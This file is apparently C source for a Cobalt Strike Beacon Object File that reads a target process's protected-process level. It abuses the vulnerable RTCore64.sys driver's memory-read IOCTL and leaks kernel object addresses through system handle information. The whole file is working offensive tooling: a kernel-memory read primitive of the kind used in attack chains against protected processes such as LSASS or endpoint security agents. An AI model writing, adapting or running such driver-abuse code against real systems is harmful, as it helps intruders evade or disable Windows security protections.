/*
 * ppenum_bof.c
 * Enumerate _PS_PROTECTION for a given PID via RTCore64.sys
 * Usage: ppenum <pid>
 */

#include <windows.h>
#include "beacon.h"

#define RTCORE64_MEMORY_READ_IOCTL  0x80002048
#define RTCORE64_DEVICE_NAME        "\\\\.\\RTCore64"
#define EPROCESS_PROTECTION_OFF     0x87A
#define SystemHandleInformation     16

typedef struct {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   ReadSize;
    DWORD   Value;
    BYTE    Pad3[16];
} RTCORE64_MEMORY;

typedef struct {
    USHORT  UniqueProcessId;
    USHORT  CreatorBackTraceIndex;
    UCHAR   ObjectTypeIndex;
    UCHAR   HandleAttributes;
    USHORT  HandleValue;
    PVOID   Object;
    ULONG   GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct {
    ULONG                          NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION;

DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);

typedef struct {
    PVOID  Reserved1;
    PVOID  PebBaseAddress;
    PVOID  Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID  Reserved3;
} PROCESS_BASIC_INFORMATION;

static DWORD get_current_pid(void)
{
    PROCESS_BASIC_INFORMATION pbi = {0};
    NTDLL$NtQueryInformationProcess((HANDLE)-1, 0, &pbi, sizeof(pbi), NULL);
    return (DWORD)pbi.UniqueProcessId;
}

static DWORD rtcore_read8(HANDLE hDrv, DWORD64 addr)
{
    RTCORE64_MEMORY mem = {0};
    DWORD ret = 0;
    mem.Address  = addr;
    mem.ReadSize = 1;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_READ_IOCTL,
                             &mem, sizeof(mem), &mem, sizeof(mem), &ret, NULL);
    return mem.Value & 0xFF;
}

static DWORD64 get_eprocess(DWORD pid)
{
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenProcess(%lu) failed (error %lu)\r\n",
            pid, KERNEL32$GetLastError());
        return 0;
    }

    ULONG buf_size = 1024 * 256;
    SYSTEM_HANDLE_INFORMATION* info = NULL;

    while (1) {
        info = KERNEL32$VirtualAlloc(NULL, buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!info) break;
        ULONG needed = 0;
        NTSTATUS st = NTDLL$NtQuerySystemInformation(SystemHandleInformation, info, buf_size, &needed);
        if (st == 0) break;
        KERNEL32$VirtualFree(info, 0, MEM_RELEASE);
        info = NULL;
        if (needed > buf_size) buf_size = needed + 4096;
        else break;
    }

    if (!info) { KERNEL32$CloseHandle(hProc); return 0; }

    USHORT our_handle = (USHORT)(ULONG_PTR)hProc;
    USHORT our_pid    = (USHORT)get_current_pid();
    DWORD64 eprocess  = 0;

    for (ULONG i = 0; i < info->NumberOfHandles; i++) {
        if (info->Handles[i].HandleValue     == our_handle &&
            info->Handles[i].UniqueProcessId == our_pid) {
            DWORD64 obj = (DWORD64)info->Handles[i].Object;
            if (obj > 0xFFFF000000000000ULL) {
                eprocess = obj;
                break;
            }
        }
    }

    KERNEL32$VirtualFree(info, 0, MEM_RELEASE);
    KERNEL32$CloseHandle(hProc);
    return eprocess;
}

static const char* type_name(BYTE t) {
    switch (t) {
        case 0: return "PsProtectedTypeNone";
        case 1: return "PsProtectedTypeProtectedLight";
        case 2: return "PsProtectedTypeProtected";
        default: return "Unknown";
    }
}

static const char* signer_name(BYTE s) {
    switch (s) {
        case 0: return "PsProtectedSignerNone";
        case 1: return "PsProtectedSignerAuthenticode";
        case 2: return "PsProtectedSignerCodeGen";
        case 3: return "PsProtectedSignerAntimalware";
        case 4: return "PsProtectedSignerLsa";
        case 5: return "PsProtectedSignerWindows";
        case 6: return "PsProtectedSignerWinTcb";
        case 7: return "PsProtectedSignerWinSystem";
        default: return "Unknown";
    }
}

void go(char* args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);
    DWORD pid = (DWORD)BeaconDataInt(&parser);

    DWORD64 eprocess = get_eprocess(pid);
    if (!eprocess) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to resolve EPROCESS\r\n");
        return;
    }

    HANDLE hDrv = KERNEL32$CreateFileA(RTCORE64_DEVICE_NAME,
                      GENERIC_READ | GENERIC_WRITE, 0, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDrv == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to open RTCore64 (error %lu)\r\n",
            KERNEL32$GetLastError());
        return;
    }

    BYTE prot   = (BYTE)rtcore_read8(hDrv, eprocess + EPROCESS_PROTECTION_OFF);
    BYTE type   = (prot >> 0) & 0x7;
    BYTE audit  = (prot >> 3) & 0x1;
    BYTE signer = (prot >> 4) & 0xF;

    BeaconPrintf(CALLBACK_OUTPUT,
        "\r\nLevel  : 0x%02X\r\n"
        "Audit  : %u\r\n"
        "Type   : %s\r\n"
        "Signer : %s\r\n",
        prot, audit, type_name(type), signer_name(signer));

    KERNEL32$CloseHandle(hDrv);
}
